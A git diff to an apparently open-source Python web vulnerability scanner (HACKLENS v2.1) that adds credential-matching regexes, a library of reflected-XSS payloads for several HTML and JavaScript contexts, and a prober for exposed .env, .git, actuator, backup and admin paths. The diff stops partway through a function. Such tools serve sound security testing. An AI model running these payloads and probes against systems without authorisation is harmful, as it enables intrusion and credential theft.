@@ -1,7 +1,7 @@
 #!/usr/bin/env python3
 """
 ╔══════════════════════════════════════════════════════════════╗
-║       HACKLENS v2.0 - Web Recon & Vulnerability Scanner      ║
+║   HACKLENS v2.1 - Web Recon & Vulnerability Scanner          ║
 ║       JS Secrets  |  Reflected XSS  |  Open Redirect        ║
 ║                                                              ║
 ║  Created by  : Yogesh Bhandage                               ║
@@ -309,8 +309,31 @@ SECRET_PATTERNS = {
 
         "Sentry DSN":             r'https://[a-f0-9]{32}@(?:o\d+\.)?sentry\.io/\d+',
     "Intercom Token":         r'(?i)["\']intercom[_\-]?(?:secret|token|api[_\-]?key)["\']\s*[:=]\s*["\']([A-Za-z0-9\-_]{20,})["\']',
+
     "Pusher Key":             r'(?i)["\']pusher[_\-]?(?:app[_\-]?)?key["\']\s*[:=]\s*["\']([a-f0-9]{20})["\']',
     "Amplitude Key":          r'(?i)["\']amplitude[_\-]?api[_\-]?key["\']\s*[:=]\s*["\']([a-f0-9]{32})["\']',
+    # -- New credential/server patterns --
+    "MySQL Password":       r'(?i)["\']mysql[_-]?pass(?:word)?["\']\s*[:=]\s*["\']([^\s\'"<>{},\\]{6,})["\']'  ,
+    "MySQL Username":       r'(?i)["\']mysql[_-]?user(?:name)?["\']\s*[:=]\s*["\']([^\s\'"<>{},\\]{3,})["\']'  ,
+    "MySQL Server":         r'(?i)["\']mysql[_-]?(?:server|host)["\']\s*[:=]\s*["\']([^\s\'"<>{},\\]{4,})["\']'  ,
+    "Engine Server":        r'(?i)["\']engine[_-]?server["\']\s*[:=]\s*["\']([^\s\'"<>{},\\]{4,})["\']'  ,
+    "Encryption Password":  r'(?i)["\']encryption[_-]?pass(?:word)?["\']\s*[:=]\s*["\']([^\s\'"<>{},\\]{6,})["\']'  ,
+    "Secret Key":           r'(?i)["\']secret[_-]?key["\']\s*[:=]\s*["\']([A-Za-z0-9\-_\/+]{16,})["\']'  ,
+    "Signing Key":          r'(?i)["\']signing[_-]?key["\']\s*[:=]\s*["\']([A-Za-z0-9\-_\/+]{16,})["\']'  ,
+    "Admin Password":       r'(?i)["\']admin[_-]?pass(?:word)?["\']\s*[:=]\s*["\']([^\s\'"<>{},\\]{6,})["\']'  ,
+    "SMTP Password":        r'(?i)["\']smtp[_-]?pass(?:word)?["\']\s*[:=]\s*["\']([^\s\'"<>{},\\]{6,})["\']'  ,
+    "SMTP Host":            r'(?i)["\']smtp[_-]?(?:host|server)["\']\s*[:=]\s*["\']([^\s\'"<>{},\\]{4,})["\']'  ,
+    "Redis Password":       r'(?i)["\']redis[_-]?(?:pass(?:word)?|auth)["\']\s*[:=]\s*["\']([^\s\'"<>{},\\]{4,})["\']'  ,
+    "App Secret":           r'(?i)["\']app[_-]?secret["\']\s*[:=]\s*["\']([A-Za-z0-9\-_\/+]{16,})["\']'  ,
+    "Cookie Secret":        r'(?i)["\'](?:cookie|session|express)[_-]?secret["\']\s*[:=]\s*["\']([A-Za-z0-9\-_\/+]{16,})["\']'  ,
+    "Connection String":    r'(?i)["\']conn(?:ection)?[_-]?str(?:ing)?["\']\s*[:=]\s*["\']([^\s\'"<>]{20,})["\']'  ,
+    "DB Pass Env":          r'(?i)(?:DB_PASS(?:WORD)?|MYSQL_PASS(?:WORD)?|POSTGRES_PASS(?:WORD)?)\s*=\s*(\S{4,})'  ,
+    "Secret Key Env":       r'(?i)(?:SECRET_KEY|APP_SECRET|APPLICATION_SECRET)\s*=\s*([A-Za-z0-9\-_\/+]{16,})'  ,
+    "Encrypt Key Env":      r'(?i)(?:ENCRYPTION_KEY|ENCRYPT_KEY|ENC_KEY)\s*=\s*([A-Za-z0-9\-_\/+]{16,})'  ,
+    "Webhook Secret":       r'(?i)["\']webhook[_-]?secret["\']\s*[:=]\s*["\']([A-Za-z0-9\-_\/+]{16,})["\']'  ,
+    "LDAP Password":        r'(?i)["\']ldap[_-]?pass(?:word)?["\']\s*[:=]\s*["\']([^\s\'"<>{},\\]{6,})["\']'  ,
+    "Bearer Secret":        r'(?i)["\']bearer[_-]?secret["\']\s*[:=]\s*["\']([A-Za-z0-9\-_\/+]{20,})["\']'  ,
+
 }
 
 # ─────────────────────────────────────────────
@@ -341,6 +364,8 @@ SEVERITY = {
         "Mapbox Token","Shopify Token","Shopify Secret",
         "Algolia API Key","Algolia App ID","Stripe Publishable","Stripe Webhook",
         "Intercom Token","Pusher Key","Amplitude Key",
+        "Secret Key","Signing Key","App Secret","Cookie Secret","Webhook Secret",
+        "Bearer Secret","Connection String","Secret Key Env","Encrypt Key Env",
     ],
     "LOW": [
         "Basic Auth URL","AWS ARN","Mailgun API Key",
@@ -354,7 +379,6 @@ SEVERITY = {
 def get_severity(name):
     for sev, names in SEVERITY.items():
         if name in names:
-            # normalise MEDIUM_CRYPTO -> MEDIUM for display
             return "MEDIUM" if sev == "MEDIUM_CRYPTO" else sev
     return "MEDIUM"
 
@@ -378,12 +402,13 @@ def make_output_dir(domain):
 
 class Logger:
     def __init__(self, out_dir):
-        self.out_dir  = out_dir
-        self.findings = []
-        self.xss      = []
-        self.redirs   = []
-        self.lock     = threading.Lock()
-        self._seen    = set()
+        self.out_dir   = out_dir
+        self.findings  = []
+        self.xss       = []
+        self.redirs    = []
+        self.info_disc = []
+        self.lock      = threading.Lock()
+        self._seen     = set()
 
     def info(self,    msg): print(f"{C}[*]{RESET} {msg}")
     def success(self, msg): print(f"{BG}[+]{RESET} {msg}")
@@ -411,6 +436,24 @@ class Logger:
         with self.lock:
             self.findings.append({"type":secret_type,"severity":sev,
                                   "value":value,"source":source,"line":line})
+
+    def info_disclosure(self, itype, url, detail, evidence=""):
+        key = f"id:{url}:{itype}"
+        with self.lock:
+            if key in self._seen:
+                return
+            self._seen.add(key)
+        print(f"  {Y}{BOLD}[Info Disclosure]{RESET} {BOLD}{itype}{RESET}")
+        print(f"  {DIM}URL     :{RESET} {url}")
+        print(f"  {DIM}Detail  :{RESET} {detail}")
+        if evidence:
+            print(f"  {DIM}Evidence:{RESET} {G}{evidence[:200]}{RESET}")
+        print()
+        with self.lock:
+            self.info_disc.append({
+                "type": itype, "url": url,
+                "detail": detail, "evidence": evidence
+            })
 
     def vuln(self, vtype, url, param, detail, evidence=""):
         # Deduplicate: strip query string for the key so same endpoint+param
@@ -440,9 +483,10 @@ class Logger:
     def save(self, domain, ts):
         data = {
             "domain": domain, "timestamp": ts,
-            "secrets":   {"total": len(self.findings), "findings": self.findings},
-            "xss":       {"total": len(self.xss),      "findings": self.xss},
-            "redirects": {"total": len(self.redirs),   "findings": self.redirs},
+            "secrets":               {"total": len(self.findings),  "findings": self.findings},
+            "xss":                   {"total": len(self.xss),       "findings": self.xss},
+            "redirects":             {"total": len(self.redirs),    "findings": self.redirs},
+            "information_disclosure":{"total": len(self.info_disc), "findings": self.info_disc},
         }
         jf = self.out_dir / f"secrets_{ts}.json"
         with open(jf, "w") as f:
@@ -522,7 +566,8 @@ class Logger:
             f'Scan: {ts} &nbsp;|&nbsp; '
             f'Secrets: <b style="color:#f44">{len(self.findings)}</b> &nbsp;|&nbsp; '
             f'XSS: <b style="color:#f44">{len(self.xss)}</b> &nbsp;|&nbsp; '
-            f'Redirects: <b style="color:#fa4">{len(self.redirs)}</b></p>'
+            f'Redirects: <b style="color:#fa4">{len(self.redirs)}</b> &nbsp;|&nbsp; '
+            f'Info Disclosure: <b style="color:#ffcc00">{len(self.info_disc)}</b></p>'
             f'{stat_html}'
             f'<h2>🔑 Secrets ({len(self.findings)})</h2>'
             f'<table><tr>'
@@ -884,154 +929,105 @@ def _is_html_response(resp):
     ct = resp.headers.get("Content-Type","").lower()
     return "html" in ct or ("text/" in ct and "javascript" not in ct)
 
-# Context-specific XSS payloads
-# Each returns (payload_to_inject, regex_that_proves_execution_context)
-def _payload_for_context(ctx, canary):
+# ── XSS Payload Library ─────────────────────────────────────────────
+# Returns list of (payload, verify_regex) per context.
+# Multiple payloads tried in order — stop on first confirmed hit.
+
+def _payloads_for_context(ctx, canary):
     if ctx == "html_body":
-        # Inject a tag directly
-        p = f'<img src=x id={canary} onerror=alert(1)>'
-        r = rf'<img\s[^>]*id={canary}[^>]*onerror=alert\(1\)'
-        return p, r
-    elif ctx in ("attr_double",):
-        # Break out of double-quoted attribute
-        p = f'" onfocus=alert(1) autofocus data-x="{canary}'
-        r = rf'onfocus=alert\(1\)\s+autofocus'
-        return p, r
-    elif ctx in ("attr_single",):
-        p = f"' onfocus=alert(1) autofocus data-x='{canary}"
-        r = rf'onfocus=alert\(1\)\s+autofocus'
-        return p, r
+        return [
+            (f'<img src=x id={canary} onerror=alert(1)>',
+             rf'<img[^>]*id={canary}[^>]*onerror=alert\(1\)'),
+            (f'><script>alert(1)//{canary}</script>',
+             rf'<script>alert\(1\)//{re.escape(canary)}</script>'),
+            (f'<svg id={canary} onload=alert(1)>',
+             rf'<svg[^>]*id={canary}[^>]*onload=alert\(1\)'),
+            (f'<details id={canary} open ontoggle=alert(1)>',
+             rf'<details[^>]*id={canary}[^>]*ontoggle=alert\(1\)'),
+            (f'<input id={canary} autofocus onfocus=alert(1)>',
+             rf'<input[^>]*id={canary}[^>]*onfocus=alert\(1\)'),
+        ]
+    elif ctx == "attr_double":
+        return [
+            (f'"><script>alert(1)//{canary}</script>',
+             rf'<script>alert\(1\)//{re.escape(canary)}</script>'),
+            (f'"><img src=x id={canary} onerror=alert(1)>',
+             rf'<img[^>]*id={canary}[^>]*onerror=alert\(1\)'),
+            (f'" onfocus=alert(1) autofocus id="{canary}',
+             rf'onfocus=alert\(1\)'),
+            (f'" onmouseover=alert(1) id="{canary}',
+             rf'onmouseover=alert\(1\)'),
+        ]
+    elif ctx == "attr_single":
+        return [
+            (f"'><script>alert(1)//{canary}</script>",
+             rf'<script>alert\(1\)//{re.escape(canary)}</script>'),
+            (f"'><img src=x id={canary} onerror=alert(1)>",
+             rf'<img[^>]*id={canary}[^>]*onerror=alert\(1\)'),
+            (f"' onfocus=alert(1) autofocus id='{canary}",
+             rf'onfocus=alert\(1\)'),
+            (f"' onmouseover=alert(1) id='{canary}",
+             rf'onmouseover=alert\(1\)'),
+        ]
     elif ctx == "attr_unquoted":
-        # For attr_unquoted we need to close the tag first, then inject a new tag.
-        # Simply injecting onfocus= is unreliable since we don't know the tag type.
-        # Close the current attribute + tag, inject a standalone script-executing tag.
-        p = f"><img src=x id={canary} onerror=alert(1)><x "
-        r = rf'<img\s[^>]*id={canary}[^>]*onerror=alert\(1\)'
-        return p, r
+        return [
+            (f'><img src=x id={canary} onerror=alert(1)><x ',
+             rf'<img[^>]*id={canary}[^>]*onerror=alert\(1\)'),
+            (f'><script>alert(1)//{canary}</script><x ',
+             rf'<script>alert\(1\)//{re.escape(canary)}</script>'),
+        ]
     elif ctx == "js_string_dq":
-        # Break out of JS double-quoted string
-        p = f'"-alert(1)-"{canary}'
-        r = rf'"-alert\(1\)-"'
-        return p, r
+        # Break double-quoted JS string then inject alert
+        return [
+            (f'";alert(1)//{canary}',
+             rf'";alert\(1\)//{re.escape(canary)}'),
+            (f'"-alert(1)-"{canary}',
+             rf'"-alert\(1\)-"'),
+            (f'"+alert(1)+"{canary}',
+             rf'"\+alert\(1\)\+"'),
+        ]
     elif ctx == "js_string_sq":
-        p = f"'-alert(1)-'{canary}"
-        r = rf"'-alert\(1\)-'"
-        return p, r
+        # Break single-quoted JS string then inject alert
+        return [
+            (f"';alert(1)//{canary}",
+             rf"';alert\(1\)//{re.escape(canary)}"),
+            (f"'-alert(1)-'{canary}",
+             rf"'-alert\(1\)-'"),
+            (f"'+alert(1)+'{canary}",
+             rf"'\+alert\(1\)\+'"),
+        ]
     elif ctx == "js_code":
-        # Already in JS code context (not a string) — inject statement separator + call
-        # Using a unique function name so we can verify it's not inside a string
-        p = f";/*{canary}*/alert(1)//"
-        r = rf'/\*{re.escape(canary)}\*/alert\(1\)//'
-        return p, r
+        # Already in executable JS — use statement separator
+        return [
+            (f";/*{canary}*/alert(1)//",
+             rf"/\*{re.escape(canary)}\*/alert\(1\)//"),
+            (f";alert(1)//{canary}",
+             rf";alert\(1\)//{re.escape(canary)}"),
+            (f"\nalert(1)//{canary}",
+             rf"alert\(1\)//{re.escape(canary)}"),
+        ]
     elif ctx == "url_param":
-        # javascript: URI
-        p = f'javascript:alert(1)//{canary}'
-        r = rf'javascript:alert\(1\)'
-        return p, r
+        return [
+            (f'javascript:alert(1)//{canary}',
+             rf'javascript:alert\(1\)//{re.escape(canary)}'),
+            (f'javascript://{canary}/%0aalert(1)',
+             rf'javascript://{re.escape(canary)}'),
+        ]
     else:
-        # Generic fallback — try html_body approach
-        p = f'<svg id={canary} onload=alert(1)>'
-        r = rf'<svg\s[^>]*id={canary}[^>]*onload=alert\(1\)'
-        return p, r
+        return [
+            (f'<img src=x id={canary} onerror=alert(1)>',
+             rf'<img[^>]*id={canary}[^>]*onerror=alert\(1\)'),
+            (f'<svg id={canary} onload=alert(1)>',
+             rf'<svg[^>]*id={canary}[^>]*onload=alert\(1\)'),
+            (f'><script>alert(1)//{canary}</script>',
+             rf'<script>alert\(1\)//{re.escape(canary)}</script>'),
+        ]
 
 
-def _detect_context(canary, response_text):
-    """
-    Find where exactly the canary landed in the HTML.
-    Returns context string or None if not reflected / is encoded.
-    """
-    # Check encoded version is NOT present (would mean safe encoding)
-    encoded = _html_encode(canary)
-    
-    # Find raw canary position
-    idx = response_text.find(canary)
-    if idx == -1:
-        return None  # not reflected at all
-    
-    # Check if it appears encoded instead
-    if encoded != canary and encoded in response_text and canary not in response_text:
-        return None  # only appears encoded → not vulnerable
-    
-    # Get surrounding context (200 chars before)
-    before = response_text[max(0, idx-200):idx]
-    after  = response_text[idx:idx+200]
-    
-    # ── Are we inside a <script> block? ──────────────────
-    # Find last <script and last </script> before our position
-    script_open  = before.rfind("<script")
-    script_close = before.rfind("</script")
-    in_script = script_open != -1 and script_open > script_close
-    
-    if in_script:
-        # ── Check if this is a JSON data block (not executable JS) ──
-        # Next.js: <script id="__NEXT_DATA__" type="application/json">
-        # Nuxt:    <script type="application/json" id="__NUXT_DATA__">
-        # These embed data as JSON — NOT executable JS code.
-        # Injecting ;alert(1) inside JSON just produces invalid JSON, not XSS.
-        script_tag_text = response_text[max(0, idx-500):idx]
-        script_tag_start = script_tag_text.rfind("<script")
-        if script_tag_start != -1:
-            script_tag_snippet = script_tag_text[script_tag_start:script_tag_start+200]
-            # Detect data-only script blocks
-            if re.search(
-                r'type=["\'](application/(?:json|ld\+json))["\']|'
-                r'id=["\'](?: __NEXT_DATA__|__NUXT_DATA__|__NUXT__|__RELAY_STORE__|__REDUX_STATE__|initial-state)["\']|'
-                r'type=["\']text/template["\']',
-                script_tag_snippet, re.I
-            ):
-                return None  # JSON data block — not executable JS
-
-        # Inside executable JS — find string context
-        code_before = before[script_open:]
-        dq = code_before.count('"') - code_before.count('\"')
-        sq = code_before.count("'") - code_before.count("\'")
-        if dq % 2 == 1:
-            return "js_string_dq"
-        if sq % 2 == 1:
-            return "js_string_sq"
-        return "js_code"
-    
-    # ── Are we inside an HTML tag attribute? ─────────────
-    # Find last < and > before our canary
-    last_lt = before.rfind("<")
-    last_gt = before.rfind(">")
-    in_tag  = last_lt != -1 and last_lt > last_gt
-    
-    if in_tag:
-        # What kind of attribute quoting?
-        tag_content = before[last_lt:]
-        # Find last = sign
-        last_eq = tag_content.rfind("=")
-        if last_eq != -1:
-            after_eq = tag_content[last_eq+1:].lstrip()
-            if after_eq.startswith('"'):
-                return "attr_double"
-            elif after_eq.startswith("'"):
-                return "attr_single"
-            else:
-                return "attr_unquoted"
-        return "attr_unquoted"
-    
-    # ── Are we inside href/src/action (URL context)? ─────
-    if re.search(r'(?:href|src|action|data)\s*=\s*["\'][^"\']*$', before, re.I):
-        return "url_param"
-    
-    # ── Default: HTML body ────────────────────────────────
-    return "html_body"
-
-
-# Params most likely to reflect user input into HTML
-XSS_REFLECT_PARAMS = {
-    'q','query','search','s','keyword','term','text','name','title',
-    'message','msg','content','data','input','value','val','username',
-    'user','email','callback','jsonp','ref','referrer','page','id',
-    'error','code','status','action','filter','sort','order','category',
-    'tag','label','from','subject','body','comment','description',
-    'template','tpl','lang','locale','format','type','view','src',
-    'source','dest','target','file','path','item','product','article',
-    'post','slug','token','key','hash','param','output','render',
-    'return','next','redirect',
-}
+def _payload_for_context(ctx, canary):
+    """Backward compat — returns first payload."""
+    payloads = _payloads_for_context(ctx, canary)
+    return payloads[0]
 
 
 class XSSScanner:
@@ -1581,6 +1577,243 @@ class RedirectScanner:
 
 
 # ─────────────────────────────────────────────
+#  INFORMATION DISCLOSURE SCANNER
+# ─────────────────────────────────────────────
+
+class InfoDisclosureScanner:
+    PROBE_PATHS = [
+        # Debug endpoints
+        ("/actuator",              "Spring Boot Actuator"),
+        ("/actuator/env",          "Spring Boot Actuator - env"),
+        ("/actuator/configprops",  "Spring Boot Actuator - config"),
+        ("/actuator/mappings",     "Spring Boot Actuator - mappings"),
+        ("/actuator/beans",        "Spring Boot Actuator - beans"),
+        ("/actuator/health",       "Spring Boot Actuator - health"),
+        ("/actuator/logfile",      "Spring Boot Actuator - logfile"),
+        ("/actuator/httptrace",    "Spring Boot Actuator - httptrace"),
+        ("/actuator/threaddump",   "Spring Boot Actuator - threaddump"),
+        ("/actuator/heapdump",     "Spring Boot Actuator - heapdump"),
+        ("/actuator/metrics",      "Spring Boot Actuator - metrics"),
+        ("/actuator/sessions",     "Spring Boot Actuator - sessions"),
+        ("/actuator/shutdown",     "Spring Boot Actuator - shutdown"),
+        ("/_ignition/health-check","Laravel Ignition"),
+        ("/telescope",             "Laravel Telescope"),
+        ("/telescope/requests",    "Laravel Telescope Requests"),
+        ("/horizon",               "Laravel Horizon"),
+        ("/phpinfo.php",           "PHP Info"),
+        ("/info.php",              "PHP Info"),
+        ("/test.php",              "PHP Test File"),
+        ("/debug",                 "Debug Endpoint"),
+        ("/debug/vars",            "Debug Vars"),
+        ("/console",               "Debug Console"),
+        ("/rails/info/properties", "Rails Info"),
+        ("/server-status",         "Server Status"),
+        ("/server-info",           "Server Info"),
+        # Config / env files
+        ("/.env",                  "Env File"),
+        ("/.env.local",            "Env File"),
+        ("/.env.production",       "Env File"),
+        ("/.env.development",      "Env File"),
+        ("/.env.staging",          "Env File"),
+        ("/.env.backup",           "Env File"),
+        ("/.env.example",          "Env File"),
+        ("/config.json",           "Config File"),
+        ("/config.js",             "Config File"),
+        ("/config.yml",            "Config File"),
+        ("/config.yaml",           "Config File"),
+        ("/settings.json",         "Config File"),
+        ("/application.properties","Config File"),
+        ("/web.config",            "Config File"),
+        # Source / git exposure
+        ("/.git/HEAD",             "Git Exposure"),
+        ("/.git/config",           "Git Config"),
+        ("/.git/COMMIT_EDITMSG",   "Git Exposure"),
+        ("/.svn/entries",          "SVN Exposure"),
+        ("/composer.json",         "Package File"),
+        ("/package.json",          "Package File"),
+        ("/requirements.txt",      "Package File"),
+        ("/Gemfile",               "Package File"),
+        # API docs
+        ("/swagger",               "Swagger UI"),
+        ("/swagger-ui.html",       "Swagger UI"),
+        ("/swagger/index.html",    "Swagger UI"),
+        ("/api-docs",              "API Docs"),
+        ("/v2/api-docs",           "API Docs"),
+        ("/v3/api-docs",           "API Docs"),
+        ("/openapi.json",          "OpenAPI Spec"),
+        ("/openapi.yaml",          "OpenAPI Spec"),
+        ("/graphql",               "GraphQL Endpoint"),
+        ("/graphiql",              "GraphiQL Interface"),
+        ("/altair",                "GraphQL Altair"),
+        ("/redoc",                 "ReDoc API Docs"),
+        # Backup files
+        ("/backup.sql",            "SQL Backup"),
+        ("/db.sql",                "SQL Backup"),
+        ("/dump.sql",              "SQL Backup"),
+        ("/database.sql",          "SQL Backup"),
+        ("/backup.zip",            "Backup Archive"),
+        ("/backup.tar.gz",         "Backup Archive"),
+        ("/www.zip",               "Backup Archive"),
+        # Admin panels
+        ("/admin",                 "Admin Panel"),
+        ("/admin/",                "Admin Panel"),
+        ("/wp-admin",              "WordPress Admin"),
+        ("/wp-login.php",          "WordPress Login"),
+        ("/administrator",         "Joomla Admin"),
+        ("/admin/login",           "Admin Login"),
+        ("/manage",                "Management Panel"),
+        ("/cpanel",                "cPanel"),
+        # Logs
+        ("/error.log",             "Log File"),
+        ("/access.log",            "Log File"),
+        ("/debug.log",             "Log File"),
+        ("/application.log",       "Log File"),
+    ]
+
+    RESPONSE_PATTERNS = [
+        # Debug mode / stack traces
+        (r"Traceback \(most recent call last\)",
+         "Python Debug Mode / Traceback", "HIGH",
+         "Python exception traceback exposed"),
+        (r"(?:Notice|Warning|Fatal error|Parse error):\s+\w.*?in /.+?on line \d+",
+         "PHP Error / Debug Mode", "HIGH",
+         "PHP error messages exposed — error_reporting enabled"),
+        (r"(?:ActiveRecord::|ActionController::|ActionView::).*?Exception",
+         "Rails Exception / Debug Mode", "HIGH",
+         "Ruby on Rails exception page exposed"),
+        (r"django\.(?:core|db|http|template).*?Exception|Django Version:",
+         "Django Debug Mode", "HIGH",
+         "Django DEBUG=True — debug page exposed"),
+        (r"(?:com\.sun\.|java\.lang\.|org\.springframework\.).*?Exception",
+         "Java Stack Trace", "HIGH",
+         "Java exception stack trace in response"),
+        (r"Whoops!.*?Exception|Ignition v\d|\"exception\":\s*\"",
+         "Laravel Debug Mode", "HIGH",
+         "Laravel Ignition/Whoops debug page exposed"),
+        (r"at\s+\w+\.\w+\(\w+\.js:\d+:\d+\)",
+         "Node.js Stack Trace", "HIGH",
+         "Node.js stack trace exposed in response"),
+        # Version disclosure
+        (r"(?:Apache|nginx|IIS|lighttpd|Caddy)/[\d.]+",
+         "Web Server Version Disclosure", "LOW",
+         "Web server version disclosed"),
+        (r"X-Powered-By:\s*.+",
+         "X-Powered-By Header", "LOW",
+         "Technology stack disclosed via X-Powered-By header"),
+        # Sensitive data
+        (r'(?:password|passwd|secret|api_key|apikey)\s*[=:]\s*["\'][^"\']{6,}["\']',
+         "Credential in Response", "CRITICAL",
+         "Hardcoded credential found in HTTP response"),
+        (r"-----BEGIN (?:RSA |EC |OPENSSH )?PRIVATE KEY-----",
+         "Private Key Exposed", "CRITICAL",
+         "Private key material in HTTP response"),
+        (r"\b(?:AKIA|ABIA|ACCA|ASIA)[A-Z0-9]{16}\b",
+         "AWS Access Key in Response", "CRITICAL",
+         "AWS access key found in HTTP response"),
+        (r"(?:DB_PASSWORD|DATABASE_URL|SECRET_KEY|JWT_SECRET|API_KEY)\s*=\s*\S+",
+         "Environment Variable Exposed", "CRITICAL",
+         "Sensitive environment variables in response"),
+        # Directory listing
+        (r"<title>Index of /|Directory listing for /|Parent Directory</a>",
+         "Directory Listing Enabled", "MEDIUM",
+         "Directory listing enabled"),
+        # Git
+        (r"ref: refs/heads/(?:main|master|develop)",
+         "Git Repository Exposed", "HIGH",
+         ".git/HEAD accessible — source code may be downloadable"),
+        # SQL errors
+        (r"(?:mysql_fetch|pg_query|ORA-\d{5}|Microsoft OLE DB|ODBC SQL Server)",
+         "SQL Error / DB Info", "HIGH",
+         "Database error message exposed"),
+        (r"You have an error in your SQL syntax|mysql_num_rows",
+         "MySQL Error", "HIGH",
+         "MySQL error in response"),
+        # phpinfo
+        (r"<title>phpinfo\(\)|PHP Version</title>",
+         "phpinfo() Exposed", "HIGH",
+         "phpinfo() output accessible"),
+        # API docs
+        (r'"swagger"\s*:\s*"[23]\.|"openapi"\s*:\s*"[23]\.',
+         "API Documentation Exposed", "MEDIUM",
+         "OpenAPI/Swagger docs publicly accessible"),
+        (r'"introspectionQuery"|"__schema"',
+         "GraphQL Introspection Enabled", "MEDIUM",
+         "GraphQL introspection enabled — full schema discoverable"),
+        # Spring Boot actuator
+        (r'"activeProfiles"\s*:|"propertySources"\s*:|"beans"\s*:\s*\[',
+         "Spring Boot Actuator Data", "HIGH",
+         "Spring Boot Actuator exposing configuration/beans"),
+        # SQL dump
+        (r"(?:INSERT INTO|CREATE TABLE|DROP TABLE).*(?:VALUES|PRIMARY KEY)",
+         "SQL Dump Accessible", "CRITICAL",
+         "SQL database dump file accessible"),
+        # Internal paths
+        (r"/(?:home|var|usr|opt|etc|tmp)/[\w/.-]+\.(?:php|py|rb|conf|log)",
+         "Internal Path Disclosure", "MEDIUM",
+         "Internal server file path in response"),
+    ]
+
+    def __init__(self, log, session):
+        self.log     = log
+        self.session = session
+        self.tested  = set()
+
+    def _check_response(self, url, resp):
+        body     = resp.text[:50000]
+        headers  = "\n".join(f"{k}: {v}" for k, v in resp.headers.items())
+        combined = body + "\n" + headers
+        for pattern, finding_type, severity, description in self.RESPONSE_PATTERNS:
+            try:
+                m = re.search(pattern, combined, re.IGNORECASE | re.MULTILINE)
+                if m:
+                    self.log.info_disclosure(
+                        f"[{severity}] {finding_type}",
+                        url, description,
+                        f"Matched: {m.group(0)[:150]}"
+                    )
+            except re.error:
+                pass
+
+    def scan_url(self, url):
+        if url in self.tested:
+            return
+        self.tested.add(url)
+        try:
+            r = self.session.get(url, timeout=10, allow_redirects=True)
+            if r.status_code in (200, 500, 501, 502, 503):
+                self._check_response(url, r)
+        except Exception:
+            pass
+
+    def probe_paths(self, base_domain, workers=5):
+        self.log.section("STEP 6: Information Disclosure Scanning")
+        tasks = []
+        for scheme in ("https", "http"):
+            base = f"{scheme}://{base_domain}"
+            for path, _ in self.PROBE_PATHS:
+                url = base.rstrip("/") + path
+                if url not in self.tested:
+                    tasks.append(url)
+        self.log.info(f"Probing {len(tasks)} known-sensitive paths on {base_domain}...")
+        with ThreadPoolExecutor(max_workers=workers) as ex:
+            futs = [ex.submit(self.scan_url, u) for u in tasks]
+            for fut in as_completed(futs):
+                pass
+
+    def scan_collected_urls(self, urls, workers=5):
+        if not urls:
+            return
+        new_urls = [u for u in urls if u not in self.tested]
+        if not new_urls:
+            return
+        self.log.info(f"Checking {len(new_urls)} collected URLs for info disclosure...")
+        with ThreadPoolExecutor(max_workers=workers) as ex:
+            futs = [ex.submit(self.scan_url, u) for u in new_urls]
+            for fut in as_completed(futs):
+                pass
+
+
+# ─────────────────────────────────────────────
 #  ENDPOINT & URL EXTRACTOR
 # ─────────────────────────────────────────────
 
@@ -2108,31 +2341,36 @@ def make_session(cookies=None, headers=None, proxy=None):
 
 def run_scan_from_list(args):
     """
-    -l mode: load a pre-crawled URL list and go straight to
-    secrets + XSS + redirect scanning. Skips subdomain enum
-    and crawling entirely.
+    -l / --list mode: feed a pre-crawled URL list directly.
+    Skips all recon. Goes straight to: secrets → XSS → redirects → info disclosure.
+    Output: <domain>-urlscan/ folder with only JSON + HTML report.
     """
     list_file = args.list
 
-    # Validate file
     if not os.path.isfile(list_file):
         print(f"{R}[!] File not found: {list_file}{RESET}")
         sys.exit(1)
 
     # Read URLs
-    with open(list_file, "r") as f:
+    with open(list_file, "r", errors="ignore") as f:
         raw_lines = [l.strip() for l in f if l.strip() and not l.startswith("#")]
 
     urls = [u for u in raw_lines if u.startswith(("http://", "https://"))]
     if not urls:
-        print(f"{R}[!] No valid URLs found in {list_file}{RESET}")
+        print(f"{R}[!] No valid URLs in {list_file}{RESET}")
+        print(f"{Y}    File must contain full URLs e.g. https://target.com/page?q=1{RESET}")
         sys.exit(1)
 
-    # Extract domain from first URL for output folder naming
-    domain = args.domain if args.domain else urllib.parse.urlparse(urls[0]).netloc
-    domain = domain.replace("https://","").replace("http://","").rstrip("/")
+    # Determine primary domain from most common host
+    from collections import Counter
+    host_counts   = Counter(urllib.parse.urlparse(u).netloc for u in urls)
+    primary_domain = host_counts.most_common(1)[0][0].split(":")[0]
 
-    out_dir = make_output_dir(domain)
+    # Output folder: <domain>-urlscan  (separate from normal scan)
+    safe_name = re.sub(r"[^\w.\-]", "_", primary_domain)
+    out_dir   = Path(f"{safe_name}-urlscan")
+    out_dir.mkdir(parents=True, exist_ok=True)
+
     ts      = datetime.now().strftime("%Y%m%d_%H%M%S")
     log     = Logger(out_dir)
     session = make_session(
@@ -2142,84 +2380,128 @@ def run_scan_from_list(args):
     )
 
     banner()
-    print(f"{C}  Mode       :{RESET} {BOLD}{Y}--list mode (pre-crawled URLs){RESET}")
-    print(f"{C}  List file  :{RESET} {BOLD}{list_file}{RESET}")
-    print(f"{C}  URLs loaded:{RESET} {BOLD}{len(urls)}{RESET}")
-    print(f"{C}  Domain     :{RESET} {BOLD}{domain}{RESET}")
+    print(f"{C}  Mode       :{RESET} {BOLD}{Y}List Scan (-l){RESET}")
+    print(f"{C}  File       :{RESET} {BOLD}{list_file}{RESET}")
+    print(f"{C}  URLs       :{RESET} {BOLD}{len(urls)}{RESET}")
+    print(f"{C}  Domain     :{RESET} {BOLD}{primary_domain}{RESET}")
     print(f"{C}  Output dir :{RESET} {BOLD}{out_dir}/{RESET}")
-    _ts = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
-    print(f"{C}  Started    :{RESET} {_ts}")
+    print(f"{C}  Started    :{RESET} {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
     print()
 
-    # Split into JS and page URLs
-    js_urls   = [u for u in urls if ".js" in urllib.parse.urlparse(u).path.lower()]
-    page_urls = [u for u in urls if u not in js_urls]
+    # Categorise URLs — deduplicate by path for JS, full URL for pages
+    JS_EXTS   = ('.js', '.jsx', '.ts', '.tsx', '.mjs', '.cjs', '.map')
+    js_urls   = []
+    page_param   = []   # has query params — test XSS + redirect
+    page_noparam = []   # no query params — secrets only
+    seen     = set()
 
-    log.success(f"JS files: {len(js_urls)} | Page URLs: {len(page_urls)}")
+    for u in urls:
+        parsed   = urllib.parse.urlparse(u)
+        path_low = parsed.path.lower()
+        is_js    = any(path_low.endswith(e) or f"{e}?" in path_low for e in JS_EXTS)
+        has_qs   = bool(parsed.query)
 
-    # Save crawled-urls.txt
-    crawl_file = out_dir / "crawled-urls.txt"
